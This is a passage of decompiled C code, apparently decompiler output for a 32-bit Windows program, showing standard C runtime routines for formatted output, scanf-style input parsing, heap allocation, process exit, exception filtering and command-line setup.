LABEL_124:
          if ( (v59 & 0x8000) == 0 )
          {
            if ( (v59 & 0x20) != 0 )
            {
              if ( (v59 & 0x40) != 0 )
                LODWORD(v26) = (__int16)sub_4095B9(&a3);
              else
                LODWORD(v26) = (unsigned __int16)sub_4095B9(&a3);
            }
            else
            {
              if ( (v59 & 0x40) == 0 )
              {
                v26 = (unsigned int)sub_4095B9(&a3);
                goto LABEL_134;
              }
              LODWORD(v26) = sub_4095B9(&a3);
            }
            v26 = (int)v26;
          }
          else
          {
            v26 = sub_4095C6(&a3);
          }
LABEL_134:
          if ( (v59 & 0x40) != 0 && v26 < 0 )
          {
            HIDWORD(v27) = -(int)v26;
            BYTE1(v59) |= 1u;
            LODWORD(v27) = (unsigned __int64)-v26 >> 32;
          }
          else
          {
            v27 = __PAIR64__(v26, HIDWORD(v26));
          }
          if ( (v59 & 0x8000) == 0 )
            LODWORD(v27) = 0;
          if ( v56 >= 0 )
            v59 &= 0xFFFFFFF7;
          else
            v56 = 1;
          if ( !v27 )
            v53 = 0;
          v58 = &v43;
          while ( 1 )
          {
            v28 = v56--;
            if ( v28 <= 0 && !v27 )
              break;
            v45 = v57;
            v29 = __PAIR64__(v27, HIDWORD(v27)) % v57 + 48;
            v30 = __PAIR64__(v27, HIDWORD(v27)) / v57;
            v27 = __PAIR64__(v30, HIDWORD(v30));
            if ( v29 > 57 )
              LOBYTE(v29) = v49 + v29;
            v31 = v58--;
            *v31 = v29;
          }
          v32 = (char *)(&v43 - v58++);
          v57 = (int)v32;
          if ( (v59 & 0x200) != 0 && (*v58 != 48 || !v32) )
          {
            --v58;
            v21 = (int)(v32 + 1);
            *v58 = 48;
            goto LABEL_155;
          }
LABEL_156:
          if ( v50 )
            goto LABEL_179;
          v33 = v59;
          if ( (v59 & 0x40) == 0 )
            goto LABEL_165;
          if ( (v59 & 0x100) != 0 )
          {
            v54[0] = 45;
LABEL_164:
            v53 = 1;
            goto LABEL_165;
          }
          if ( (v59 & 1) != 0 )
          {
            v54[0] = 43;
            goto LABEL_164;
          }
          if ( (v59 & 2) != 0 )
          {
            v54[0] = 32;
            goto LABEL_164;
          }
LABEL_165:
          v34 = v52 - v53 - v57;
          if ( (v59 & 0xC) == 0 )
            write_multi_char(32, v52 - v53 - v57, File, (int)&v55);
          write_string((int)v54, v53, File, (int)&v55);
          if ( (v33 & 8) != 0 && (v33 & 4) == 0 )
            write_multi_char(48, v34, File, (int)&v55);
          if ( v51 && v57 > 0 )
          {
            v35 = (wchar_t *)v58;
            v36 = v57 - 1;
            do
            {
              v37 = *v35++;
              v38 = wctomb(v46, v37);
              if ( v38 <= 0 )
                break;
              write_string((int)v46, v38, File, (int)&v55);
            }
            while ( v36-- );
          }
          else
          {
            write_string((int)v58, v57, File, (int)&v55);
          }
          if ( (v59 & 4) != 0 )
            write_multi_char(32, v34, File, (int)&v55);
LABEL_179:
          v4 = *v60;
          v5 = v60 + 1;
          v6 = *v60++ == 0;
          if ( v6 )
            return v55;
          v7 = v56;
          v3 = v48;
          break;
        default:
          goto LABEL_179;
      }
    }
  }
  return v55;
}
// 412A10: using guessed type __int16 *off_412A10[2];
// 412C28: using guessed type char *off_412C28;
// 412C2C: using guessed type wchar_t *off_412C2C;
// 413000: using guessed type int (__cdecl *off_413000)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 413004: using guessed type int (__cdecl *off_413004)(_DWORD);
// 41300C: using guessed type int (__cdecl *off_41300C)(_DWORD);

//----- (0040951B) --------------------------------------------------------
int __cdecl write_char(int Buffer, FILE *File, int a3)
{
  int v4; // eax
  bool v5; // zf
  int result; // eax

  if ( --File->_cnt < 0 )
  {
    v4 = _flsbuf(Buffer, File);
  }
  else
  {
    *File->_ptr++ = Buffer;
    v4 = (unsigned __int8)Buffer;
  }
  v5 = v4 == -1;
  result = a3;
  if ( v5 )
    *(_DWORD *)a3 = -1;
  else
    ++*(_DWORD *)a3;
  return result;
}

//----- (00409550) --------------------------------------------------------
int __cdecl write_multi_char(int WCh, int a2, FILE *File, int a4)
{
  int result; // eax
  int i; // edi

  result = a2;
  for ( i = a2 - 1; result > 0; result = i-- )
  {
    result = write_char(WCh, File, a4);
    if ( *(_DWORD *)a4 == -1 )
      break;
  }
  return result;
}

//----- (00409581) --------------------------------------------------------
int __cdecl write_string(int a1, int a2, FILE *File, int a4)
{
  int result; // eax
  int i; // ebx
  int v7; // eax

  result = a2;
  for ( i = a2 - 1; result > 0; result = i-- )
  {
    v7 = *(char *)a1++;
    result = write_char(v7, File, a4);
    if ( *(_DWORD *)a4 == -1 )
      break;
  }
  return result;
}

//----- (004095B9) --------------------------------------------------------
int __cdecl sub_4095B9(_DWORD *a1)
{
  *a1 += 4;
  return *(_DWORD *)(*a1 - 4);
}

//----- (004095C6) --------------------------------------------------------
__int64 __cdecl sub_4095C6(_DWORD *a1)
{
  *a1 += 8;
  return *(_QWORD *)(*a1 - 8);
}

//----- (004095D6) --------------------------------------------------------
__int16 __cdecl sub_4095D6(_DWORD *a1)
{
  *a1 += 4;
  return *(_WORD *)(*a1 - 4);
}

//----- (004095E4) --------------------------------------------------------
void __cdecl free(void *Block)
{
  char *v1; // eax

  if ( Block )
  {
    v1 = __sbh_find_block((int)Block);
    if ( v1 )
      __sbh_free_block(v1, (unsigned int)Block);
    else
      HeapFree(hHeap, 0, Block);
  }
}

//----- (00409613) --------------------------------------------------------
void *__cdecl sub_409613(size_t a1)
{
  return _nh_malloc(a1, dword_493AB8);
}
// 493AB8: using guessed type int dword_493AB8;

//----- (00409625) --------------------------------------------------------
void *__cdecl _nh_malloc(size_t Size, int a2)
{
  void *result; // eax

  if ( Size > 0xFFFFFFE0 )
    return 0;
  while ( 1 )
  {
    result = _heap_alloc(Size);
    if ( result || !a2 )
      break;
    if ( !sub_40BDBE(Size) )
      return 0;
  }
  return result;
}

//----- (00409651) --------------------------------------------------------
void *__cdecl _heap_alloc(unsigned int a1)
{
  int v1; // esi
  void *result; // eax

  v1 = a1;
  if ( a1 > dword_413020 || (result = __sbh_alloc_block(a1)) == 0 )
  {
    if ( !a1 )
      v1 = 1;
    result = HeapAlloc(hHeap, 0, (v1 + 15) & 0xFFFFFFF0);
  }
  return result;
}
// 413020: using guessed type int dword_413020;

//----- (00409687) --------------------------------------------------------
int __cdecl _input(FILE *Stream, int a2, int a3)
{
  unsigned __int8 *v3; // esi
  unsigned __int8 v4; // al
  FILE *v5; // edi
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int i; // eax
  int v10; // eax
  int v11; // edi
  int v12; // ebx
  int v13; // eax
  int v14; // esi
  int v15; // eax
  int v16; // ebx
  int v17; // ebx
  char *v18; // esi
  FILE *v19; // edi
  int v26; // eax
  char *v30; // edi
  int v31; // eax
  unsigned int v32; // edx
  unsigned __int8 v33; // al
  unsigned __int8 v34; // cl
  unsigned __int8 v35; // al
  int v36; // esi
  WCHAR *v37; // esi
  int v39; // eax
  int v40; // eax
  __int64 v41; // rax
  int v42; // eax
  __int64 v43; // rax
  int v44; // eax
  int v45; // edi
  int v46; // eax
  int v47; // ebx
  int v48; // eax
  int v49; // eax
  int v50; // ecx
  int result; // eax
  int v52; // [esp-4h] [ebp-1D4h]
  char v53; // [esp+Ch] [ebp-1C4h] BYREF
  char v54; // [esp+Dh] [ebp-1C3h] BYREF
  char v55[32]; // [esp+16Ch] [ebp-64h] BYREF
  int v56; // [esp+18Ch] [ebp-44h]
  WCHAR WideCharStr; // [esp+192h] [ebp-3Eh] BYREF
  int v58; // [esp+194h] [ebp-3Ch]
  CHAR MultiByteStr[3]; // [esp+198h] [ebp-38h] BYREF
  char v60; // [esp+19Bh] [ebp-35h]
  int v61; // [esp+19Ch] [ebp-34h]
  WCHAR *v62; // [esp+1A0h] [ebp-30h]
  WCHAR *v63; // [esp+1A4h] [ebp-2Ch]
  __int64 v64; // [esp+1A8h] [ebp-28h]
  int v65; // [esp+1B0h] [ebp-20h]
  int v66; // [esp+1B4h] [ebp-1Ch]
  char v67; // [esp+1B8h] [ebp-18h]
  char v68; // [esp+1B9h] [ebp-17h]
  char v69; // [esp+1BAh] [ebp-16h]
  char v70; // [esp+1BBh] [ebp-15h]
  int CharType; // [esp+1BCh] [ebp-14h]
  char v72; // [esp+1C1h] [ebp-Fh]
  char v73; // [esp+1C2h] [ebp-Eh]
  char v74; // [esp+1C3h] [ebp-Dh]
  int v75; // [esp+1C4h] [ebp-Ch]
  char v76; // [esp+1CBh] [ebp-5h]
  int v77; // [esp+1CCh] [ebp-4h] BYREF
  char *v78; // [esp+1DCh] [ebp+Ch]
  unsigned __int8 *v79; // [esp+1DCh] [ebp+Ch]

  v70 = 0;
  v3 = (unsigned __int8 *)a2;
  v4 = *(_BYTE *)a2;
  v77 = 0;
  v61 = 0;
  if ( !v4 )
    goto LABEL_256;
  v5 = Stream;
  while ( 2 )
  {
    if ( cbMultiByte <= 1 )
      v6 = off_412A10[0][v4] & 8;
    else
      v6 = _isctype(v4, 8);
    if ( v6 )
    {
      --v77;
      v7 = _whiteout((int)&v77, v5);
      sub_40A0FD(v7, v5);
      v8 = *++v3;
      for ( i = isspace(v8); i; i = isspace(v10) )
        v10 = *++v3;
    }
    if ( *v3 != 37 )
    {
      ++v77;
      v47 = sub_40A0E3(v5);
      v48 = *v3++;
      CharType = v47;
      v79 = v3;
      if ( v48 == v47 )
      {
        if ( off_412A10[0][(unsigned __int8)v47] >= 0 )
          goto LABEL_247;
        ++v77;
        v49 = sub_40A0E3(v5);
        v50 = *v3++;
        v79 = v3;
        if ( v50 == v49 )
        {
          --v77;
          goto LABEL_247;
        }
        --v77;
        sub_40A0FD(v49, v5);
        --v77;
        sub_40A0FD(v47, v5);
      }
      else
      {
        --v77;
        sub_40A0FD(v47, v5);
      }
      break;
    }
    v60 = 0;
    v67 = 0;
    v68 = 0;
    v73 = 0;
    v72 = 0;
    v69 = 0;
    v11 = 0;
    v76 = 0;
    v66 = 0;
    v65 = 0;
    v75 = 0;
    v74 = 1;
    v62 = 0;
    do
    {
      v12 = *++v3;
      if ( cbMultiByte <= 1 )
        v13 = off_412A10[0][(unsigned __int8)v12] & 4;
      else
        v13 = _isctype((unsigned __int8)v12, 4);
      if ( v13 )
      {
        ++v65;
        v75 = v12 + 10 * v75 - 48;
        continue;
      }
      if ( v12 <= 78 )
      {
        switch ( v12 )
        {
          case 'N':
            continue;
          case '*':
            ++v73;
            continue;
          case 'F':
            continue;
          case 'I':
            if ( v3[1] == 54 && v3[2] == 52 )
            {
              v62 = (WCHAR *)((char *)v62 + 1);
              v64 = 0i64;
              v3 += 2;
              continue;
            }
            break;
          case 'L':
            ++v74;
            continue;
        }
LABEL_32:
        ++v72;
        continue;
      }
      if ( v12 == 104 )
      {
        --v74;
        --v76;
      }
      else
      {
        if ( v12 == 108 )
        {
          ++v74;
        }
        else if ( v12 != 119 )
        {
          goto LABEL_32;
        }
        ++v76;
      }
    }
    while ( !v72 );
    v78 = (char *)v3;
    if ( !v73 )
    {
      v56 = a3;
      a3 += 4;
      v63 = *(WCHAR **)(a3 - 4);
    }
    v72 = 0;
    if ( !v76 )
    {
      if ( *v3 == 83 || *v3 == 67 )
        v76 = 1;
      else
        v76 = -1;
    }
    v58 = *v3 | 0x20;
    v14 = v58;
    if ( v58 != 110 )
    {
      if ( v58 == 99 || v58 == 123 )
      {
        ++v77;
        v15 = sub_40A0E3(Stream);
      }
      else
      {
        v15 = _whiteout((int)&v77, Stream);
      }
      CharType = v15;
    }
    if ( v65 && !v75 )
    {
LABEL_253:
      --v77;
      sub_40A0FD(CharType, Stream);
      break;
    }
    if ( v14 > 111 )
    {
      switch ( v14 )
      {
        case 'p':
          v74 = 1;
          goto LABEL_181;
        case 's':
          if ( v76 > 0 )
            v69 = 1;
          v30 = asc_412C30;
          break;
        case 'u':
          goto LABEL_181;
        case 'x':
LABEL_63:
          v16 = CharType;
          if ( CharType == 45 )
          {
            v68 = 1;
          }
          else if ( CharType != 43 )
          {
LABEL_129:
            if ( v16 != 48 )
              goto LABEL_189;
            ++v77;
            v31 = sub_40A0E3(Stream);
            v16 = v31;
            CharType = v31;
            if ( (_BYTE)v31 == 120 || (_BYTE)v31 == 88 )
            {
              ++v77;
              v16 = sub_40A0E3(Stream);
              CharType = v16;
              v52 = 120;
              goto LABEL_134;
            }
            v66 = 1;
            if ( v14 != 120 )
            {
              v52 = 111;
LABEL_134:
              v14 = v52;
              goto LABEL_189;
            }
            --v77;
            sub_40A0FD(v31, Stream);
            v16 = 48;
            goto LABEL_188;
          }
          if ( --v75 || !v65 )
          {
            ++v77;
            v16 = sub_40A0E3(Stream);
            CharType = v16;
          }
          else
          {
            v72 = 1;
          }
          goto LABEL_129;
        case '{':
          if ( v76 > 0 )
            v69 = 1;
          v30 = v78 + 1;
          v78 = v30;
          if ( *v30 != 94 )
          {
LABEL_141:
            memset(v55, 0, sizeof(v55));
            if ( v58 == 123 && *v30 == 93 )
            {
              LOBYTE(v32) = 93;
              ++v30;
              v55[11] = 32;
            }
            else
            {
              LOBYTE(v32) = v60;
            }
            while ( 1 )
            {
              v33 = *v30;
              if ( *v30 == 93 )
                break;
              ++v30;
              if ( v33 == 45 && (_BYTE)v32 && (v34 = *v30, *v30 != 93) )
              {
                ++v30;
                if ( (unsigned __int8)v32 >= v34 )
                {
                  v35 = v32;
                  LOBYTE(v32) = v34;
                }
                else
                {
                  v35 = v34;
                }
                if ( (unsigned __int8)v32 <= v35 )
                {
                  v32 = (unsigned __int8)v32;
                  v36 = v35 - (unsigned __int8)v32 + 1;
                  do
                  {
                    v55[v32 >> 3] |= 1 << (v32 & 7);
                    ++v32;
                    --v36;
                  }
                  while ( v36 );
                }
                LOBYTE(v32) = 0;
              }
              else
              {
                LOBYTE(v32) = v33;
                v55[v33 >> 3] |= 1 << (v33 & 7);
              }
            }
            if ( *v30 )
            {
              if ( v58 == 123 )
                v78 = v30;
              v37 = v63;
              --v77;
              v62 = v63;
              sub_40A0FD(CharType, Stream);
              while ( 1 )
              {
                if ( v65 )
                {
                  if ( !v75-- )
                    break;
                }
                ++v77;
                v39 = sub_40A0E3(Stream);
                CharType = v39;
                if ( v39 == -1 || ((1 << (v39 & 7)) & (v67 ^ v55[v39 >> 3])) == 0 )
                {
                  --v77;
                  sub_40A0FD(v39, Stream);
                  break;
                }
                if ( v73 )
                {
                  v62 = (WCHAR *)((char *)v62 + 1);
                }
                else
                {
                  if ( v69 )
                  {
                    MultiByteStr[0] = v39;
                    if ( off_412A10[0][(unsigned __int8)v39] < 0 )
                    {
                      ++v77;
                      MultiByteStr[1] = sub_40A0E3(Stream);
                    }
                    mbtowc(&WideCharStr, MultiByteStr, cbMultiByte);
                    *v37++ = WideCharStr;
                  }
                  else
                  {
                    *(_BYTE *)v37 = v39;
                    v37 = (WCHAR *)((char *)v37 + 1);
                  }
                  v63 = v37;
                }
              }
              if ( v62 != v37 )
              {
                if ( !v73 )
                {
                  ++v61;
                  if ( v58 != 99 )
                  {
                    if ( v69 )
                      *v63 = 0;
                    else
                      *(_BYTE *)v63 = 0;
                  }
                }
                goto LABEL_242;
              }
            }
            goto LABEL_256;
          }
          ++v30;
          break;
        default:
LABEL_117:
          if ( (unsigned __int8)*v78 == CharType )
          {
            --v70;
            if ( !v73 )
              a3 = v56;
            goto LABEL_242;
          }
          goto LABEL_253;
      }
LABEL_140:
      v67 = -1;
      goto LABEL_141;
    }
    switch ( v14 )
    {
      case 'o':
LABEL_181:
        v16 = CharType;
        if ( CharType == 45 )
        {
          v68 = 1;
        }
        else if ( CharType != 43 )
        {
          goto LABEL_189;
        }
        if ( !--v75 && v65 )
        {
          v72 = 1;
          goto LABEL_189;
        }
        ++v77;
        v16 = sub_40A0E3(Stream);
LABEL_188:
        CharType = v16;
LABEL_189:
        if ( v62 )
        {
          if ( !v72 )
          {
            while ( 1 )
            {
              if ( v14 == 120 )
              {
                if ( cbMultiByte <= 1 )
                  v40 = off_412A10[0][v16] & 0x80;
                else
                  v40 = _isctype(v16, 128);
                if ( !v40 )
                  goto LABEL_209;
                LODWORD(v41) = sub_40BEF0(v64, 4u);
                v64 = v41;
                v16 = _hextodec(v16);
                CharType = v16;
              }
              else
              {
                if ( cbMultiByte <= 1 )
                  v42 = off_412A10[0][v16] & 4;
                else
                  v42 = _isctype(v16, 4);
                if ( !v42 )
                {
LABEL_209:
                  --v77;
                  sub_40A0FD(v16, Stream);
                  break;
                }
                if ( v14 == 111 )
                {
                  if ( v16 >= 56 )
                    goto LABEL_209;
                  LODWORD(v43) = sub_40BEF0(v64, 3u);
                }
                else
                {
                  v43 = 10 * v64;
                }
                v64 = v43;
              }
              ++v66;
              v64 += v16 - 48;
              if ( v65 )
              {
                if ( !--v75 )
                  break;
              }
              ++v77;
              v16 = sub_40A0E3(Stream);
              CharType = v16;
            }
          }
          if ( v68 )
            v64 = -v64;
        }
        else
        {
          if ( !v72 )
          {
            while ( 1 )
            {
              if ( v14 == 120 || v14 == 112 )
              {
                if ( cbMultiByte <= 1 )
                  v46 = off_412A10[0][v16] & 0x80;
                else
                  v46 = _isctype(v16, 128);
                if ( !v46 )
                {
LABEL_231:
                  --v77;
                  sub_40A0FD(v16, Stream);
                  break;
                }
                v45 = 16 * v11;
                v16 = _hextodec(v16);
                CharType = v16;
              }
              else
              {
                if ( cbMultiByte <= 1 )
                  v44 = off_412A10[0][v16] & 4;
                else
                  v44 = _isctype(v16, 4);
                if ( !v44 )
                  goto LABEL_231;
                if ( v14 == 111 )
                {
                  if ( v16 >= 56 )
                    goto LABEL_231;
                  v45 = 8 * v11;
                }
                else
                {
                  v45 = 10 * v11;
                }
              }
              ++v66;
              v11 = v45 + v16 - 48;
              if ( v65 )
              {
                if ( !--v75 )
                  break;
              }
              ++v77;
              v16 = sub_40A0E3(Stream);
              CharType = v16;
            }
          }
          if ( v68 )
            v11 = -v11;
        }
        if ( v66 )
        {
          if ( v73 )
            goto LABEL_242;
          ++v61;
          goto LABEL_237;
        }
        goto LABEL_256;
      case 'c':
        if ( !v65 )
        {
          ++v75;
          v65 = 1;
        }
        if ( v76 > 0 )
          v69 = 1;
        v30 = asc_412C38;
        goto LABEL_140;
      case 'd':
        goto LABEL_181;
    }
    if ( v14 <= 100 )
      goto LABEL_117;
    if ( v14 <= 103 )
    {
      v17 = CharType;
      v18 = &v53;
      if ( CharType == 45 )
      {
        v53 = 45;
        v18 = &v54;
      }
      else if ( CharType != 43 )
      {
        v19 = Stream;
        goto LABEL_70;
      }
      v19 = Stream;
      --v75;
      ++v77;
      v17 = sub_40A0E3(Stream);
      CharType = v17;
LABEL_70:
      if ( !v65 || v75 > 349 )
        v75 = 349;
      while ( cbMultiByte <= 1 ? off_412A10[0][v17] & 4 : _isctype(v17, 4) )
      {
        if ( !v75-- )
          break;
        ++v66;
        *v18++ = v17;
        ++v77;
        v17 = sub_40A0E3(v19);
        CharType = v17;
      }
      if ( byte_412C20 == (_BYTE)v17 )
      {
        if ( v75-- )
        {
          ++v77;
          v17 = sub_40A0E3(v19);
          *v18 = byte_412C20;
          CharType = v17;
          ++v18;
          while ( cbMultiByte <= 1 ? off_412A10[0][v17] & 4 : _isctype(v17, 4) )
          {
            if ( !v75-- )
              break;
            ++v66;
            *v18++ = v17;
            ++v77;
            v17 = sub_40A0E3(v19);
            CharType = v17;
          }
        }
      }
      if ( v66 && (v17 == 101 || v17 == 69) )
      {
        if ( v75-- )
        {
          *v18++ = 101;
          ++v77;
          v26 = sub_40A0E3(v19);
          v17 = v26;
          CharType = v26;
          if ( v26 == 45 )
          {
            *v18++ = 45;
            goto LABEL_95;
          }
          if ( v26 == 43 )
          {
LABEL_95:
            if ( !v75-- )
            {
              v75 = 0;
              goto LABEL_98;
            }
            goto LABEL_97;
          }
LABEL_98:
          while ( cbMultiByte <= 1 ? off_412A10[0][v17] & 4 : _isctype(v17, 4) )
          {
            if ( !v75-- )
              break;
            ++v66;
            *v18++ = v17;
LABEL_97:
            ++v77;
            v17 = sub_40A0E3(v19);
            CharType = v17;
          }
        }
      }
      --v77;
      sub_40A0FD(v17, v19);
      if ( v66 )
      {
        if ( !v73 )
        {
          ++v61;
          *v18 = 0;
          off_413008(v74 - 1, v63, &v53);
        }
        goto LABEL_242;
      }
      break;
    }
    if ( v14 == 105 )
    {
      v14 = 100;
      goto LABEL_63;
    }
    if ( v14 != 110 )
      goto LABEL_117;
    v11 = v77;
    if ( v73 )
      goto LABEL_242;
LABEL_237:
    if ( v62 )
    {
      *(_QWORD *)v63 = v64;
    }
    else if ( v74 )
    {
      *(_DWORD *)v63 = v11;
    }
    else
    {
      *v63 = v11;
    }
LABEL_242:
    ++v70;
    v79 = (unsigned __int8 *)(v78 + 1);
    v3 = v79;
LABEL_247:
    if ( CharType == -1 )
    {
      if ( *v3 == 37 && v79[1] == 110 )
      {
        v3 = v79;
        goto LABEL_251;
      }
LABEL_257:
      result = v61;
      if ( !v61 && !v70 )
        result = -1;
      return result;
    }
LABEL_251:
    v4 = *v3;
    if ( *v3 )
    {
      v5 = Stream;
      continue;
    }
    break;
  }
LABEL_256:
  if ( CharType == -1 )
    goto LABEL_257;
  return v61;
}
// 409FAF: conditional instruction was optimized away because of 'esi.4 in (==64|6F..72|>=74)'
// 409E24: variable 'v41' is possibly undefined
// 409E84: variable 'v43' is possibly undefined
// 412A10: using guessed type __int16 *off_412A10[2];
// 412C20: using guessed type char byte_412C20;
// 413008: using guessed type int (__cdecl *off_413008)(_DWORD, _DWORD, _DWORD);

//----- (0040A0AC) --------------------------------------------------------
int __cdecl _hextodec(int C)
{
  int v1; // esi
  int v2; // eax

  v1 = C;
  if ( cbMultiByte <= 1 )
    v2 = off_412A10[0][C] & 4;
  else
    v2 = _isctype(C, 4);
  if ( !v2 )
    v1 = (C & 0xFFFFFFDF) - 7;
  return v1;
}
// 412A10: using guessed type __int16 *off_412A10[2];

//----- (0040A0E3) --------------------------------------------------------
int __cdecl sub_40A0E3(FILE *File)
{
  if ( --File->_cnt < 0 )
    return _filbuf(File);
  return *(unsigned __int8 *)File->_ptr++;
}

//----- (0040A0FD) --------------------------------------------------------
int __cdecl sub_40A0FD(int Character, FILE *Stream)
{
  int result; // eax

  if ( Character != -1 )
    result = ungetc_0(Character, Stream);
  return result;
}

//----- (0040A114) --------------------------------------------------------
int __cdecl _whiteout(int a1, FILE *Stream)
{
  int v2; // edi

  do
  {
    ++*(_DWORD *)a1;
    v2 = sub_40A0E3(Stream);
  }
  while ( isspace(v2) );
  return v2;
}

//----- (0040A20C) --------------------------------------------------------
void _cinit()
{
  if ( dword_494C34 )
    dword_494C34();
  sub_40A2F4(off_40F008, (unsigned int)&unk_40F014);
  sub_40A2F4(&dword_40F000, (unsigned int)&unk_40F004);
}
// 494C34: using guessed type int (*dword_494C34)(void);

//----- (0040A239) --------------------------------------------------------
void __cdecl sub_40A239(UINT uExitCode)
{
  doexit(uExitCode, 0, 0);
}

//----- (0040A24A) --------------------------------------------------------
void __cdecl sub_40A24A(UINT uExitCode)
{
  doexit(uExitCode, 1, 0);
}

//----- (0040A25B) --------------------------------------------------------
void __cdecl doexit(UINT uExitCode, int a2, int a3)
{
  HANDLE v3; // eax
  void (**v4)(void); // esi

  if ( dword_49399C == 1 )
  {
    v3 = GetCurrentProcess();
    TerminateProcess(v3, uExitCode);
  }
  dword_493998 = 1;
  byte_493994 = a3;
  if ( !a2 )
  {
    if ( dword_494C30 )
    {
      v4 = (void (**)(void))(dword_494C2C - 4);
      if ( dword_494C2C - 4 >= (unsigned int)dword_494C30 )
      {
        do
        {
          if ( *v4 )
            (*v4)();
          --v4;
        }
        while ( (unsigned int)v4 >= dword_494C30 );
      }
    }
    sub_40A2F4(off_40F018, (unsigned int)&unk_40F020);
  }
  sub_40A2F4(&dword_40F024, (unsigned int)&unk_40F028);
  if ( !a3 )
  {
    dword_49399C = 1;
    ExitProcess(uExitCode);
  }
}
// 493994: using guessed type char byte_493994;
// 493998: using guessed type int dword_493998;
// 49399C: using guessed type int dword_49399C;
// 494C2C: using guessed type int dword_494C2C;
// 494C30: using guessed type int dword_494C30;

//----- (0040A2F4) --------------------------------------------------------
void __cdecl sub_40A2F4(void (**a1)(void), unsigned int a2)
{
  while ( (unsigned int)a1 < a2 )
  {
    if ( *a1 )
      (*a1)();
    ++a1;
  }
}

//----- (0040A30E) --------------------------------------------------------
int __cdecl _XcptFilter(int a1, struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  int *v2; // eax
  void (__cdecl *v3)(int); // ebx
  int result; // eax
  int v5; // ecx
  int v6; // edx
  _DWORD *v7; // esi
  int v8; // eax
  int v9; // esi
  int v10; // [esp+Ch] [ebp+8h]

  v2 = xcptlookup(a1);
  if ( !v2 )
    return UnhandledExceptionFilter(ExceptionInfo);
  v3 = (void (__cdecl *)(int))v2[2];
  if ( !v3 )
    return UnhandledExceptionFilter(ExceptionInfo);
  if ( v3 == (void (__cdecl *)(int))5 )
  {
    v2[2] = 0;
    result = 1;
  }
  else
  {
    if ( v3 != (void (__cdecl *)(int))1 )
    {
      v10 = dword_4939A0;
      dword_4939A0 = (int)ExceptionInfo;
      v5 = v2[1];
      if ( v5 == 8 )
      {
        if ( dword_412CB8 < dword_412CB8 + dword_412CBC )
        {
          v6 = dword_412CBC;
          v7 = (_DWORD *)((char *)&unk_412C48 + 12 * dword_412CB8);
          do
          {
            *v7 = 0;
            v7 += 3;
            --v6;
          }
          while ( v6 );
        }
        v8 = *v2;
        v9 = dword_412CC4;
        switch ( v8 )
        {
          case -1073741682:
            dword_412CC4 = 131;
            break;
          case -1073741680:
            dword_412CC4 = 129;
            break;
          case -1073741679:
            dword_412CC4 = 132;
            break;
          case -1073741677:
            dword_412CC4 = 133;
            break;
          case -1073741683:
            dword_412CC4 = 130;
            break;
          case -1073741681:
            dword_412CC4 = 134;
            break;
          case -1073741678:
            dword_412CC4 = 138;
            break;
        }
        v3(8);
        dword_412CC4 = v9;
      }
      else
      {
        v2[2] = 0;
        v3(v5);
      }
      dword_4939A0 = v10;
    }
    result = -1;
  }
  return result;
}
// 412CB8: using guessed type int dword_412CB8;
// 412CBC: using guessed type int dword_412CBC;
// 412CC4: using guessed type int dword_412CC4;
// 4939A0: using guessed type int dword_4939A0;

//----- (0040A44F) --------------------------------------------------------
int *__cdecl xcptlookup(int a1)
{
  int *result; // eax

  result = dword_412C40;
  if ( dword_412C40[0] != a1 )
  {
    do
      result += 3;
    while ( result < &dword_412C40[3 * dword_412CC0] && *result != a1 );
  }
  if ( result >= &dword_412C40[3 * dword_412CC0] || *result != a1 )
    result = 0;
  return result;
}
// 412CC0: using guessed type int dword_412CC0;

//----- (0040A492) --------------------------------------------------------
_BYTE *_wincmdln()
{
  _BYTE *v0; // esi
  unsigned __int8 v1; // al

  if ( !dword_494C28 )
    sub_40895B();
  v0 = (_BYTE *)dword_494E68;
  if ( *(_BYTE *)dword_494E68 != 34 )
  {
    if ( *(_BYTE *)dword_494E68 > 0x20u )
    {
      do
        ++v0;
      while ( *v0 > 0x20u );
    }
    goto LABEL_12;
  }
  while ( 1 )
  {
    v1 = *++v0;
    if ( v1 == 34 || !v1 )
      break;
    if ( sub_40C056(v1) )
      ++v0;
  }
  if ( *v0 != 34 )
    goto LABEL_12;
  do
  {
    ++v0;
LABEL_12:
    ;
  }
  while ( *v0 && *v0 <= 0x20u );
  return v0;
}
// 494C28: using guessed type int dword_494C28;
// 494E68: using guessed type int dword_494E68;

//----- (0040A4EA) --------------------------------------------------------
void _setenvp()
{
  char *v0; // esi
  int v1; // edi
  _DWORD *v2; // esi
  const char *i; // edi
  size_t v4; // eax
  size_t v5; // ebp
  void *v6; // eax

  if ( !dword_494C28 )
    sub_40895B();
  v0 = dword_493920;
  v1 = 0;
  while ( *v0 )
  {
    if ( *v0 != 61 )
      ++v1;
    v0 += strlen(v0) + 1;
  }
  v2 = sub_409613(4 * v1 + 4);
  dword_49397C = (int)v2;
  if ( !v2 )
    _amsg_exit(9u);
  for ( i = dword_493920; *i; i += v5 )
  {
    v4 = strlen(i);
    v5 = v4 + 1;
    if ( *i != 61 )
    {
      v6 = sub_409613(v4 + 1);
      *v2 = v6;
      if ( !v6 )
        _amsg_exit(9u);
      sub_407750();
      ++v2;
    }
  }
  free(dword_493920);
  dword_493920 = 0;
  *v2 = 0;
  dword_494C24 = 1;
}
// 49397C: using guessed type int dword_49397C;
// 494C24: using guessed type int dword_494C24;
// 494C28: using guessed type int dword_494C28;

//----- (0040A5A3) --------------------------------------------------------
int _setargv()
{
  unsigned __int8 *v0; // edi
  unsigned __int8 **v1; // esi
  int result; // eax
  int v3; // [esp+Ch] [ebp-8h] BYREF
  int v4; // [esp+10h] [ebp-4h] BYREF

  if ( !dword_494C28 )
    sub_40895B();
  GetModuleFileNameA(0, Filename, 0x104u);
  dword_49398C = (int)Filename;
  v0 = (unsigned __int8 *)Filename;
  if ( *(_BYTE *)dword_494E68 )
    v0 = (unsigned __int8 *)dword_494E68;
  parse_cmdline(v0, 0, 0, &v4, &v3);
  v1 = (unsigned __int8 **)sub_409613(v3 + 4 * v4);
  if ( !v1 )
    _amsg_exit(8u);
  parse_cmdline(v0, v1, (unsigned __int8 *)&v1[v4], &v4, &v3);
  result = v4 - 1;
  dword_493974 = (int)v1;
  dword_493970 = v4 - 1;
  return result;
}
// 493970: using guessed type int dword_493970;
// 493974: using guessed type int dword_493974;
// 49398C: using guessed type int dword_49398C;
// 494C28: using guessed type int dword_494C28;
// 494E68: using guessed type int dword_494E68;

//----- (0040A63C) --------------------------------------------------------
_DWORD *__cdecl parse_cmdline(unsigned __int8 *a1, unsigned __int8 **a2, unsigned __int8 *a3, _DWORD *a4, _DWORD *a5)
{
  unsigned __int8 *v6; // esi
